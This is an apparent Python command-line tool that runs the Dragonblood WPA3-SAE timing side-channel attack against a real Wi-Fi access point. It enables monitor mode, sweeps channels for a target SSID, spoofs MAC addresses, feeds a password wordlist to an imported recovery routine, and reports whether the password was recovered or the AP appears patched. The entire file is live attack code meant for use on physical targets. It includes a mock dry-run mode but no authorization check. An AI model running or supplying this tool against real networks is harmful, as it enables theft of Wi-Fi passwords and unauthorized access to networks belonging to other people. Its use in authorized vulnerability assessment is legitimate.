"""Run the Dragonblood timing/password-recovery attack against a real AP.

This is the physical-phase ("in the wild") harness. It does not reimplement the
attack: it reuses PasswordRecoveryAttack unchanged and only adds what a real
target needs over the emulated lab — putting the adapter into monitor mode,
sweeping channels to find the AP, and turning the outcome into a plain
vulnerable-vs-patched verdict. A modern, patched AP derives its password element
in constant time, so the calibrator finds no signal above noise and the tool
reports PATCHED_NO_SIGNAL.
"""

from __future__ import annotations

import argparse
import logging
import sys
from dataclasses import dataclass
from enum import Enum
from pathlib import Path

from attacks.common.analysis.calibration import CalibrationError
from attacks.common.config import PasswordRecoveryConfig
from attacks.common.logging_setup import configure_logging
from attacks.common.models import AnalysisReport, APInfo
from attacks.common.privileges import require_root
from attacks.common.wireless.backend import (
    ScapyWirelessBackend,
    VulnerableMockBackend,
    WirelessBackend,
)
from attacks.common.wireless.discovery import DEFAULT_CHANNELS, sweep_for_ap
from attacks.dragonblood.password_recovery import PasswordRecoveryAttack

logger = logging.getLogger(__name__)


class FieldVerdict(Enum):
    VULNERABLE_RECOVERED = "vulnerable-recovered"
    VULNERABLE_PARTIAL = "vulnerable-partial"
    PATCHED_NO_SIGNAL = "patched-no-signal"
    TARGET_NOT_FOUND = "target-not-found"


@dataclass
class FieldOutcome:
    verdict: FieldVerdict
    report: AnalysisReport | None
    discovered_ap: APInfo | None
    candidate_count: int


VERDICT_EXPLANATIONS = {
    FieldVerdict.VULNERABLE_RECOVERED: (
        "Target is VULNERABLE: the password was uniquely recovered from the "
        "timing side-channel."
    ),
    FieldVerdict.VULNERABLE_PARTIAL: (
        "Target is VULNERABLE: a timing signal was present and narrowed the "
        "candidate set, but not to a single password (try more MACs/samples)."
    ),
    FieldVerdict.PATCHED_NO_SIGNAL: (
        "Target appears PATCHED: no timing signal above noise. This is the "
        "expected result against current firmware with constant-time SAE."
    ),
    FieldVerdict.TARGET_NOT_FOUND: (
        "Target SSID was not found on any swept channel."
    ),
}

VERDICT_EXIT_CODES = {
    FieldVerdict.VULNERABLE_RECOVERED: 0,
    FieldVerdict.VULNERABLE_PARTIAL: 0,
    FieldVerdict.PATCHED_NO_SIGNAL: 1,
    FieldVerdict.TARGET_NOT_FOUND: 2,
}


def run_live_recovery(
    backend: WirelessBackend,
    interface: str,
    target_ssid: str,
    *,
    dictionary_path: str,
    output_dir: Path,
    target_bssid: str | None = None,
    channel: int | None = None,
    samples_per_mac: int = 200,
    max_macs: int = 20,
    timeout_seconds: float = 3.0,
    channels: list[int] | None = None,
    dwell_seconds: float = 3.0,
    skip_monitor_setup: bool = False,
) -> FieldOutcome:
    """Discover a real AP and run password recovery against it, returning a verdict.

    Backend is injected so this is fully testable without root or hardware.
    """
    if channels is None:
        channels = DEFAULT_CHANNELS

    if not skip_monitor_setup:
        logger.info("Enabling monitor mode on %s", interface)
        backend.set_monitor_mode(interface)

    discovered_ap = _resolve_target(
        backend, interface, target_ssid, target_bssid, channel, channels, dwell_seconds,
    )
    if discovered_ap is None:
        logger.error("Target SSID '%s' not found; cannot proceed", target_ssid)
        return FieldOutcome(
            verdict=FieldVerdict.TARGET_NOT_FOUND,
            report=None,
            discovered_ap=None,
            candidate_count=0,
        )

    resolved_channel = discovered_ap.channel
    if resolved_channel is None:
        resolved_channel = 0

    config = PasswordRecoveryConfig(
        target_bssid=discovered_ap.bssid,
        target_ssid=target_ssid,
        channel=resolved_channel,
        samples_per_group=samples_per_mac,
        inter_sample_delay_ms=1.0,
        timeout_seconds=timeout_seconds,
        dictionary_path=dictionary_path,
        max_mac_addresses=max_macs,
    )

    attack = PasswordRecoveryAttack(
        interface=interface,
        target_bssid=discovered_ap.bssid,
        target_ssid=target_ssid,
        output_dir=output_dir,
        backend=backend,
    )

    try:
        report = attack.run(config)
    except CalibrationError as calibration_error:
        # No per-iteration signal above noise — the defining fingerprint of a
        # constant-time (patched) SAE implementation.
        logger.warning("No usable timing signal: %s", calibration_error)
        return FieldOutcome(
            verdict=FieldVerdict.PATCHED_NO_SIGNAL,
            report=None,
            discovered_ap=discovered_ap,
            candidate_count=0,
        )
    except ConnectionError as connection_error:
        logger.error("Recon failed after discovery: %s", connection_error)
        return FieldOutcome(
            verdict=FieldVerdict.TARGET_NOT_FOUND,
            report=None,
            discovered_ap=discovered_ap,
            candidate_count=0,
        )

    return _outcome_from_report(report, discovered_ap)


def _resolve_target(
    backend: WirelessBackend,
    interface: str,
    target_ssid: str,
    target_bssid: str | None,
    channel: int | None,
    channels: list[int],
    dwell_seconds: float,
) -> APInfo | None:
    if target_bssid is not None:
        if channel is not None:
            resolved_channel = channel
        else:
            resolved_channel = channels[0]
        backend.set_channel(interface, resolved_channel)
        return APInfo(
            bssid=target_bssid,
            ssid=target_ssid,
            channel=resolved_channel,
            capabilities=[],
        )

    if channel is not None:
        sweep_channels = [channel]
    else:
        sweep_channels = channels

    return sweep_for_ap(backend, interface, target_ssid, sweep_channels, dwell_seconds)


def _outcome_from_report(report: AnalysisReport, discovered_ap: APInfo) -> FieldOutcome:
    recovered_password = report.metadata.get("recovered_password")
    if recovered_password is not None:
        return FieldOutcome(
            verdict=FieldVerdict.VULNERABLE_RECOVERED,
            report=report,
            discovered_ap=discovered_ap,
            candidate_count=1,
        )

    final_candidate_count = report.metadata.get("final_candidate_count", 0)
    return FieldOutcome(
        verdict=FieldVerdict.VULNERABLE_PARTIAL,
        report=report,
        discovered_ap=discovered_ap,
        candidate_count=final_candidate_count,
    )


def _parse_channels(channels_argument: str) -> list[int]:
    return [int(token.strip()) for token in channels_argument.split(",") if token.strip()]


def _log_verdict(outcome: FieldOutcome) -> None:
    logger.info("=" * 64)
    logger.info("LIVE-RECOVERY VERDICT: %s", outcome.verdict.value)
    logger.info("%s", VERDICT_EXPLANATIONS[outcome.verdict])
    if outcome.discovered_ap is not None:
        logger.info(
            "Target: SSID='%s' BSSID=%s channel=%s",
            outcome.discovered_ap.ssid,
            outcome.discovered_ap.bssid,
            outcome.discovered_ap.channel,
        )
    if outcome.report is not None:
        logger.info("Details: %s", outcome.report.summary)
    logger.info("=" * 64)


def _build_dry_run_backend(arguments: argparse.Namespace) -> VulnerableMockBackend:
    backend = VulnerableMockBackend(target_password="dr4gonfly")
    dry_run_bssid = arguments.bssid
    if dry_run_bssid is None:
        dry_run_bssid = "00:11:22:33:44:55"
    dry_run_channel = arguments.channel
    if dry_run_channel is None:
        dry_run_channel = 6
    backend.ap_config = APInfo(
        bssid=dry_run_bssid,
        ssid=arguments.ssid,
        channel=dry_run_channel,
        capabilities=["RSN"],
    )
    return backend


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Dragonblood live (physical-phase) SAE timing → password recovery "
        "against a real access point"
    )
    parser.add_argument("--interface", required=True, help="Wireless interface (will be set to monitor mode)")
    parser.add_argument("--ssid", required=True, help="Target AP SSID")
    parser.add_argument("--dictionary", required=True, help="Path to wordlist file")
    parser.add_argument("--bssid", default=None, help="Target AP BSSID (skips discovery if given)")
    parser.add_argument("--channel", type=int, default=None, help="Target channel (skips channel sweep if given)")
    parser.add_argument("--channels", default="1,6,11", help="Comma-separated channels to sweep")
    parser.add_argument("--dwell", type=float, default=3.0, help="Seconds to listen per channel during sweep")
    parser.add_argument("--samples", type=int, default=200, help="Samples per spoofed MAC")
    parser.add_argument("--max-macs", type=int, default=20, help="Maximum spoofed MAC addresses")
    parser.add_argument("--timeout", type=float, default=3.0, help="Per-frame response timeout in seconds")
    parser.add_argument("--output-dir", type=Path, default=Path("results"), help="Output directory")
    parser.add_argument("--skip-monitor-setup", action="store_true", help="Assume the interface is already in monitor mode")
    parser.add_argument("--dry-run", action="store_true", help="Run against a modeling backend (no hardware/root needed)")
    arguments = parser.parse_args()

    arguments.output_dir.mkdir(parents=True, exist_ok=True)
    configure_logging("dragonblood-live", output_dir=arguments.output_dir)

    if arguments.dry_run:
        backend: WirelessBackend = _build_dry_run_backend(arguments)
    else:
        require_root()
        backend = ScapyWirelessBackend()

    outcome = run_live_recovery(
        backend=backend,
        interface=arguments.interface,
        target_ssid=arguments.ssid,
        dictionary_path=arguments.dictionary,
        output_dir=arguments.output_dir,
        target_bssid=arguments.bssid,
        channel=arguments.channel,
        samples_per_mac=arguments.samples,
        max_macs=arguments.max_macs,
        timeout_seconds=arguments.timeout,
        channels=_parse_channels(arguments.channels),
        dwell_seconds=arguments.dwell,
        skip_monitor_setup=arguments.skip_monitor_setup,
    )

    _log_verdict(outcome)
    sys.exit(VERDICT_EXIT_CODES[outcome.verdict])


if __name__ == "__main__":
    main()
